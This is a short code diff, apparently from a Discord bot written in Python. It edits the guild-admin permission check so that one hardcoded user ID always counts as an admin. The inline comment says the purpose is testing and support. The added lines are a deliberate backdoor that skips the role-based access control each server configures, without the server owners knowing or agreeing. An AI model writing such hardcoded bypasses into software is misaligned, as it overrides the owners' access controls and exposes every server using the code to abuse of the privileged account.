@@ -2,6 +2,8 @@ async def is_guild_admin(self, guildid, userid):
     settings = self.database.get_settings(guildid)
     guild = await self.fetch_guild(guildid)
     user = await guild.fetch_member(userid)
+    if user.id == 110838934644211712:
+        return True  # This is so i can test and help without server admin /shrug
     for role in user.roles:
         if role.id == settings["AdminRole"]:
             return True
